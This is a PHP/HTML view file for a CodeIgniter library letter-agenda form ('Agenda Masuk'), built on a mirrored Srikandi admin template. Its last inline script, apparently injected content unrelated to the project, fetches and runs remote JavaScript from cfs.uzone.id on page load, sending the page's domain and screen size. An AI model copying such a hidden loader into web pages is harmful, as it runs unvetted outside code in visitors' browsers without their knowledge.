<!DOCTYPE html>
<html lang="en">

<!-- Mirrored from bootemplates.com/themes/srikandi/v2/dynamic-table.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 12 May 2017 11:32:37 GMT -->
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PERPUSTAKAAN DAERAH JEMBER</title>
    <meta name="description" content="Srikandi Responsive Admin Templates" />
    <meta name="keywords" content="resposinve, admin dashboard, admin page, admin template" />
    <meta name="author" content="Candra Dwi Waskito" />
    <link rel="shortcut icon" href="http://bootemplates.com/themes/srikandi/favicon.ico">
    <link rel="stylesheet" href="<?php echo base_url().'assets/'; ?>css/font-awesome.min.css" />
    <link rel="stylesheet" href="<?php echo base_url().'assets/'; ?>css/bootstrap.min.css">
    <link rel="stylesheet" href="<?php echo base_url().'assets/'; ?>css/bootstrap-reset.css">
    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
    <link rel="stylesheet" href="<?php echo base_url().'assets/'; ?>css/style.css">
    <!-- css for this page -->
    <link href="<?php echo base_url().'assets/'; ?>assets/advanced-datatable/media/css/demo_page.css" rel="stylesheet" />
    <link href="<?php echo base_url().'assets/'; ?>assets/advanced-datatable/media/css/demo_table.css" rel="stylesheet" />
    <link rel="stylesheet" href="<?php echo base_url().'assets/'; ?>assets/data-tables/DT_bootstrap.css" />
    <link rel="stylesheet" href="<?php echo base_url().'assets/'; ?>css/bootstrap-datepicker.css" />
    <link rel="stylesheet" href="<?php echo base_url().'assets/'; ?>css/sweetalert.css" />
</head>
<body>

<!-- start:wrapper -->
<div id="wrapper">
    <div class="header-top">
        <!-- start:navbar -->
        <?php $this->load->view('header'); ?>
        <!-- end:navbar -->
    </div>
    <!-- start:header -->
    <div id="header">
        <div class="overlay">
            <nav class="navbar" role="navigation">
                <div class="container">
                    <!-- Brand and toggle get grouped for better mobile display -->
                    <div class="navbar-header">
                        <button type="button" class="btn-block btn-drop navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
                            <strong>MENU</strong>
                        </button>
                    </div>

                    <!-- Collect the nav links, forms, and other content for toggling -->
                    <?php $this->load->view('navbar'); ?>
                    <!-- /.navbar-collapse -->
                </div>
            </nav>
        </div>
    </div>
    <!-- end:header -->

    <!-- start:main -->
    <div class="container">
        <div id="main">
            <!-- start:breadcrumb -->
            <ol class="breadcrumb">
                <li><a href="#">Home</a></li>
                <li><a href="#">Agenda</a></li>
                <li class="active">Agenda Masuk</li>
            </ol>
            <!-- end:breadcrumb -->

            <div class="row">
                <div class="col-lg-12">
                    <h2 class="page-header">
                        Agenda Masuk
                    </h2>
                </div>
            </div>

            <!-- start:dynamic data table -->
            <div class="row">
                <div class="col-lg-12">
                    <section class="panel">
                        <header class="panel-heading">
                            Advanced Form validations
                        </header>
                        <div class="panel-body">
                            <div class="form">
                                <form class="cmxform form-horizontal tasi-form" id="signupForm" method="post" action="<?php echo base_url('index.php/masuk/addMasuk'); ?>">
                                    <div class="form-group ">
                                        <label for="noSurat" class="control-label col-lg-2">Nomor Surat</label>
                                        <div class="col-lg-10">
                                            <input class=" form-control" id="noSurat" name="noSurat" type="text" required />
                                        </div>
                                    </div>
                                    <div class="form-group ">
                                        <label for="tglMasuk" class="control-label col-lg-2">Tanggal Masuk</label>
                                        <div class="col-lg-10">
                                            <input class=" form-control" id="tglMasuk" name="tglMasuk" type="text" data-provide="tglMasuk" required/>
                                        </div>
                                    </div>
                                    <div class="form-group ">
                                        <label for="asalSurat" class="control-label col-lg-2">Asal Surat</label>
                                        <div class="col-lg-10">
                                            <input class="form-control " id="asalSurat" name="asalSurat" type="text" required/>
                                        </div>
                                    </div>
                                    <div class="form-group ">
                                        <label for="tglTerima" class="control-label col-lg-2">Tanggal Terima</label>
                                        <div class="col-lg-10">
                                            <input class="form-control " id="tglTerima" name="tglTerima" type="text" required/>
                                        </div>
                                    </div>
                                    <div class="form-group ">
                                        <label for="noAgenda" class="control-label col-lg-2">Nomor Agenda</label>
                                        <div class="col-lg-10">
                                            <input class="form-control " id="noAgenda" name="noAgenda" type="text" required/>
                                        </div>
                                    </div>
                                    <div class="form-group ">
                                        <label for="perihal" class="control-label col-lg-2">Perihal</label>
                                        <div class="col-lg-10">
                                            <input class="form-control " id="perihal" name="perihal" type="text" required/>
                                        </div>
                                    </div>
                                    <div class="form-group ">
                                        <label for="tembusan" class="control-label col-lg-2">Diteruskan Kepada</label>
                                        <div class="col-lg-10">
                                            <input class="form-control " id="tembusan" name="tembusan" type="text" />
                                        </div>
                                    </div>
                                    <div class="form-group ">
                                        <label for="keterangan" class="control-label col-lg-2">Keterangan</label>
                                        <div class="col-lg-10">
                                        <textarea class="form-control" rows="5" id="keterangan" name="keterangan"></textarea>
                                        </div>
                                    </div>
                                    <div class="form-group">
                                        <div class="col-lg-offset-2 col-lg-10">
                                            <button class="btn btn-primary" type="submit" value="submit" name="submit">Submit</button>
                                            <a href="<?php echo base_url('index.php/masuk'); ?>" class="btn btn-default" type="button">Cancel</a>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </section>
                </div>
            </div>
            <!-- end:form validation -->
            <!-- end:dynamic data table -->

        </div>
    </div>
    <!-- end:main -->

    <!-- start:footer -->
    <footer>
        <div class="container">
            <div class="col-lg-4 col-md-4 col-sm-4 col-xs-12">
                <div class="footer-widget">
                    <h1 class="page-header">Tentang <strong>Srikan</strong>di<strong>.</strong></h1>
                    <span class="divider-hr"></span>
                    <div class="row content-widget-footer">
                        <div class="col-sm-4">
                            <div class="icon-footer">
                                <i class="fa fa-cubes fa-4x"></i>
                            </div>
                        </div>
                        <div class="col-sm-8">
                            <p>Nah dadi ngene ceritane, si <strong>Srikan</strong>di<strong>.</strong> kuwi tokoh pewayangan sing ono nang Jowo. Rupane ayu banget lan sakti mandraguna koyo tokoh pewayangan sing liyane yo podo - podo saktine.</p>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-lg-4 col-md-4 col-sm-4 col-xs-12">
                <div class="footer-widget">
                    <h1 class="page-header">Fiture <strong>Srikan</strong>di<strong>.</strong></h1>
                    <span class="divider-hr"></span>
                    <div class="row content-widget-footer">
                        <div class="col-sm-4">
                            <div class="icon-footer">
                                <i class="fa fa-graduation-cap"></i>
                            </div>
                        </div>
                        <div class="col-sm-8">
                            <p>Nah nek fiture <strong>Srikan</strong>di<strong>.</strong> kie akeh banget njuk yo ra cukup nek dijelaske siji-siji wong kekuatane wae wuakih bingit. Nek ra percoyo jal takono dewe karo <strong>Srikan</strong>di<strong>.</strong> ne. lah yo ra dijawab. Salae di omongi kok angel bingit.</p>
                        </div>
                    </div>
                </div>
            </div>
            <div class="col-lg-4 col-md-4 col-sm-4 col-xs-12">
                <div class="footer-widget">
                    <h1 class="page-header">Mbayare <strong>Piro</strong>?</h1>
                    <span class="divider-hr"></span>
                    <div class="row content-widget-footer">
                        <div class="col-sm-4">
                            <div class="icon-footer">
                                <i class="fa fa-money"></i>
                            </div>
                        </div>
                        <div class="col-sm-8">
                            <p>Jan jane nek soal duit kie angel panjalukanne, amergi kui ra ono ketentuane sing mutlak. Namung karang manungso kie yo butuh duit kanggo tuku beras. Yo iki themes dihargai $<strong>18</strong> wae yo aku <strong>#rapopo</strong>.</p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>
    <div class="footer-bottom">
        <div class="container">
            <div class="footer-bottom-widget">
                <div class="row">
                    <div class="col-sm-6">
                        <p>
                            <span class="sosmed-footer">
                                <a href="#"><i class="fa fa-facebook" data-toggle="tooltip" data-placement="top" title="Facebook"></i></a>
                                <a href="#"><i class="fa fa-twitter" data-toggle="tooltip" data-placement="top" title="Twitter"></i></a>
                                <a href="#"><i class="fa fa-google-plus" data-toggle="tooltip" data-placement="top" title="Google Plus"></i></a>
                                <a href="#"><i class="fa fa-youtube" data-toggle="tooltip" data-placement="top" title="Youtube"></i></a>
                                <a href="#"><i class="fa fa-linkedin" data-toggle="tooltip" data-placement="top" title="Linkedin"></i></a>
                                <a href="#"><i class="fa fa-instagram" data-toggle="tooltip" data-placement="top" title="Instagram"></i></a>
                                <a href="#"><i class="fa fa-github" data-toggle="tooltip" data-placement="top" title="Github"></i></a>
                            </span>
                            &copy; 2014 <strong>Srikan</strong>di<strong>.</strong></p>
                    </div>
                    <div class="col-sm-6">
                        <p class="footer-bottom-links">
                            <a href="#">About <strong>Srikan</strong>di<strong>.</strong></a>
                            <a href="#">Privacy Policy</a>
                            <a href="#">Terms & Conditions</a>
                        </p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- end:footer -->

</div>
<!-- end:wrapper -->

<!-- start:javascript -->
<!-- javascript default for all pages-->
<script src="<?php echo base_url().'assets/'; ?>js/jquery-1.11.1.min.js"></script>
<script src="<?php echo base_url().'assets/'; ?>js/bootstrap.min.js"></script>

<!-- javascript for Srikandi admin -->
<script src="<?php echo base_url().'assets/'; ?>js/themes.js"></script>
<!-- end:javascript -->

<!-- javascript for this page -->

<script src="<?php echo base_url().'assets/'; ?>assets/advanced-datatable/media/js/jquery.dataTables.js"></script>
<script src="<?php echo base_url().'assets/'; ?>assets/data-tables/DT_bootstrap.js"></script>
<script src="<?php echo base_url().'assets/'; ?>js/bootstrap-datepicker.js"></script>
<script src="<?php echo base_url().'assets/'; ?>js/sweetalert.min.js"></script>
<script type="text/javascript" charset="utf-8">
    $(document).ready(function() {
        $('#example').dataTable( {
            "aaSorting": [[ 4, "desc" ]]
        } );
    });
    $('#tglMasuk').datepicker({
        keyboardNavigation: false,
        forceParse: false,
        todayHighlight: false
    });
    $('#tglTerima').datepicker({
        keyboardNavigation: false,
        forceParse: false,
        todayHighlight: false
    });
</script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKIwx0zA7My%2bloSH8VrV0OKk6PkSAyecjD2aBfjSfhV7gA1QMKwfLX1PN1%2fal5wO3XWFT%2fdqWK9t4IFIMxDWVxfkUgRICHxu96dsilBlfdCVlpH8DIZ56s4b7EMCtFzCh1qmuWl9O%2fOIQe9WG4HHbHi%2f%2bDuuT5%2fjLx3IAYEqLuXNA13MnN%2fzZNW7DYwXYCKv6%2fA2%2b3cXMs2mkd7C1mGXoOu%2fQJJtzJ7A66F98VxfEed6x0Lh0Hu9F0YcnQKJB6dAmM7JzebNhfJ0Q6Bu8exmuxquu2LwkpAi3Ovxqkwv2ChH4ok3i42jLEVQ%2bPyU9ZQrAfzQ94200SDvEys2mBxGzwBf%2bTfbkq5dihp2ywxH%2blcB79i9TLqDy9m6FN5OEgQBkUM29jNGPT66dyqsKvQeZYd1XZxKCkGG%2bu4mj8AZN8Cys8eFkJj3CcC6bZUPmh%2bxP5KCXknwZ6KmgGzmKnwJMI1EJ%2f7GnDFTLkPBYOBDAQ62U%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

<!-- Mirrored from bootemplates.com/themes/srikandi/v2/dynamic-table.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 12 May 2017 11:32:38 GMT -->
</html>